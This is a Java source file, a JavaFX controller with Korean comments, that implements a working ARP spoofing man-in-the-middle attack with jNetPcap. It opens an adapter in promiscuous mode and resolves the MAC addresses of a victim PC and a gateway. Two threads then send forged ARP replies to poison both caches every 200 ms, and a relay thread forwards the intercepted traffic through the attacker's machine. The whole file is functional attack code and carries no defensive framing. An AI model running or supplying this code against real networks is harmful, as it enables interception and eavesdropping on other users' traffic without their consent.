package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable{
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	//<네트워크 어댑터 출력>
	ObservableList<String> networkList = FXCollections.observableArrayList(); //네트워크 어댑터를 담는 공간
	
	private ArrayList<PcapIf> allDevs = null; //네트워크 어댑터를 담는 공간
	
	@Override
	public void initialize(URL location, ResourceBundle resources) { //변수들을 불러왔을 때의 초기화 메소드
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder(); //에러가 발생했을 때 에러를 담는 버퍼
		int r = Pcap.findAllDevs(allDevs, errbuf); //모든 네트워크 어댑터들을 allDevs안에 담음
		if(r==Pcap.NOT_OK || allDevs.isEmpty()) { //Pcap파일에러 또는 어떠한 어댑터장치도 발견되지 않았을 때
			textArea.appendText("네트워크 장치를 찾을 수 없습니다.\n"+errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("네트워크 장치를 찾았습니다.\n원하시는 장치를 선택해주세요.\n");
		for(PcapIf device : allDevs) { //네트워크 어댑터 개수만큼 출력
			networkList.add(device.getName()+" "+
		((device.getDescription()!=null) ? device.getDescription() : "설명 없음"));
		}
		networkListView.setItems(networkList); //실제로 우리에게 네트워크 어댑터를 보여줌
	}
	//=======================================================================================================
	//<버튼을 클릭해서 네트워크 어댑터를 선택했을 때의 내용을 처리>
	public void networkPickAction() {
		if (networkListView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex()); //네트워크 어댑터를 선택
		networkListView.setDisable(true); //네트워크 어댑터를 선택하면 더이상 다른 어댑터는 선택 불가
		pickButton.setDisable(true); //네트워크 어댑터를 선택하면 더이상 버튼도 동작하지 않음
		
		int snaplen = 64*1024; //캡쳐할 패킷의 길이
		int flags = Pcap.MODE_PROMISCUOUS;
		int timeout = 1; //0.001초마다 패킷 챕쳐
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf); //네트워크 어댑터 정보를 담음
		
		if(Main.pcap==null) { //네트워크 어댑터를 선택했을 때 에러 발생 시 실행
			textArea.appendText("네트워크 장치를 열 수 없습니다.\n"+ errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("장치 선택: "+Main.device.getName()+"\n");
		textArea.appendText("네트워크 장치를 활성화했습니다.\n");
	}
	//=========================================================================================================
	//다른 사용자의 MAC 주소를 가져오는 메소드
	public void getMACAction(){	
		if(!pickButton.isDisable()) {
			textArea.appendText("네트워크 장치를 먼저 선택해주세요.\n");
			return;
		}
		
		ARP arp = new ARP();
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER);
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null;
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			//IP주소 입력(IPv4주소 형태로 입력해야함. 잘못 입력시 catch로 이동)
			Main.myMAC=Main.device.getHardwareAddress();
			Main.myIP=InetAddress.getByName(myIP.getText()).getAddress();
			Main.senderIP=InetAddress.getByName(senderIP.getText()).getAddress();
			Main.targetIP=InetAddress.getByName(targetIP.getText()).getAddress();
		} catch (Exception e) {
			textArea.appendText("IP 주소가 잘못되었습니다.\n");
			return;
		}
		
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		//ARP Request 패킷
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP); //다른 사용자의 MAC주소를 얻어옴
		buffer = ByteBuffer.wrap(arp.getPacket()); //현재 ARP패킷의 내용을 버퍼에담음
		if(Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n"+Util.bytesToString(arp.getPacket())+"\n");
		
		long targetStartTime=System.currentTimeMillis();
		
		//ARP Reply 패킷
		Main.targetMAC=new byte[6];
		while(Main.pcap.nextEx(header,buf)!=Pcap.NEXT_EX_NOT_OK) {	//패킷을 캡쳐하는데 오류가 발생하지 않은 경우
			if(System.currentTimeMillis()-targetStartTime >=500) {
				textArea.appendText("타겟이 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header,buf);	//패킷을 담는 공간
			packet.scan(id); //id를 이용하여 패킷을 캡쳐
			byte[] sourceIP = new byte[4];	//보낸사람의 IP
			System.arraycopy(packet.getByteArray(0,packet.size()),28,sourceIP,0,4);
			
			if(packet.getByte(12)==0x08 && packet.getByte(13)==0x06 && packet.getByte(20)==0x00 && packet.getByte(21)==0x02
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP)) && packet.hasHeader(eth)) {	//ARP 프로토콜인지 확인
				Main.targetMAC=eth.source(); //캡쳐한 패킷에 타겟의 MAC주소를 넣어줌
				break;
			}
			else {
				continue;
			}
		}
		textArea.appendText("타켓 맥 주소: "+Util.bytesToString(Main.targetMAC)+"\n");
		
		//ARP Request 패킷
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP); //다른 사용자의 MAC주소를 얻어옴
		buffer = ByteBuffer.wrap(arp.getPacket()); //현재 ARP패킷의 내용을 버퍼에담음
		if(Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("센더에게 ARP Request를 보냈습니다.\n"+Util.bytesToString(arp.getPacket())+"\n");
		long senderStartTime=System.currentTimeMillis();
		//ARP Reply 패킷
		Main.senderMAC=new byte[6];
		while(Main.pcap.nextEx(header,buf)!=Pcap.NEXT_EX_NOT_OK) {	//패킷을 캡쳐하는데 오류가 발생하지 않은 경우
			if(System.currentTimeMillis()-senderStartTime >=500) {
				textArea.appendText("센더가 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header,buf);	//패킷을 담는 공간
			packet.scan(id); //id를 이용하여 패킷을 캡쳐
			byte[] sourceIP = new byte[4];	//보낸사람의 IP
			System.arraycopy(packet.getByteArray(0,packet.size()),28,sourceIP,0,4);
			
			if(packet.getByte(12)==0x08 && packet.getByte(13)==0x06 && packet.getByte(20)==0x00 && packet.getByte(21)==0x02
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP)) && packet.hasHeader(eth)) {	//ARP 프로토콜인지 확인
				Main.senderMAC=eth.source(); //캡쳐한 패킷에 타겟의 MAC주소를 넣어줌
				break;
			}
			else {
				continue;
			}
		}
		textArea.appendText("센더 맥 주소: "+Util.bytesToString(Main.senderMAC)+"\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
		}
	//=========================================================================================================
	class SenderARPSpoofing extends Thread {	//특정 작업을 반복적으로 수행할 때 사용하는 클래스(Thread)
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, Main.targetIP, 
					Main.senderMAC, Main.senderIP); //센더(피해자PC)에게 공유기의 MAC주소는 공격자의 MAC주소라고 알림
			Platform.runLater(() -> {
				textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread {	//특정 작업을 반복적으로 수행할 때 사용하는 클래스(Thread)
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, Main.targetIP, 
					Main.targetMAC, Main.targetIP); 
			Platform.runLater(() -> {
				textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	//=============================================================================================
	class ARPRelay extends Thread{ //패킷 재전송 클래스(받은 패킷을 게이트웨이한테 전송)
		@Override
		public void run() {
			Ip4 ip = new Ip4(); //ip변수
			PcapHeader header = new PcapHeader(JMemory.POINTER); //헤더 정보를 담을 수 있는 변수
			JBuffer buf = new JBuffer(JMemory.POINTER);
			Platform.runLater(() -> {textArea.appendText("ARP Relay를 진행합니다.\n");});
			
			while(Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //패킷 캡쳐
				PcapPacket packet = new PcapPacket(header,buf);
				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				byte[] data = packet.getByteArray(0,packet.size()); //캡쳐가 된 패킷 정보
				byte[] tempDestinationMAC = new byte[6]; //임시적으로 목적지MAC 주소를 담음
				byte[] tempSourceMAC = new byte[6]; //임시적으로 출발지MAC 주소를 담음
				
				System.arraycopy(data,0,tempDestinationMAC,0,6); 
				System.arraycopy(data,6,tempSourceMAC,0,6);
				
				if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //출발지,목적지 MAC 주소가 자신의 MAC 주소일 경우
						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMAC))){
					if(packet.hasHeader(ip)) { //목적지 MAC주소가 해커의 MAC주소일 경우 게이트웨이한테 다시 패킷을 전송
						if(Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))) {
							System.arraycopy(Main.targetMAC, 0, data, 0,6);
							ByteBuffer buffer = ByteBuffer.wrap(data);
							Main.pcap.sendPacket(buffer);
					}
				}
			}
			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //피해자PC가 게이트웨이한테 패킷을 전송
					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.senderMAC))) {
				if(packet.hasHeader(ip)) {
					System.arraycopy(Main.targetMAC,0,data,0,6);
					System.arraycopy(Main.myMAC,0,data,6,6);
					ByteBuffer buffer = ByteBuffer.wrap(data);
					Main.pcap.sendPacket(buffer);
				}
				}
			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //게이트웨이가 센더에게 패킷을 받으면 해커에게 패킷을 전송
					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))) {
				if(packet.hasHeader(ip)) {
					if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
						System.arraycopy(Main.senderMAC, 0, data, 0,6);
						System.arraycopy(Main.myMAC, 0, data, 6,6);
						ByteBuffer buffer = ByteBuffer.wrap(data);
						Main.pcap.sendPacket(buffer);
				}
				}
				}
				System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
				
			}
		}
	}
	}
		

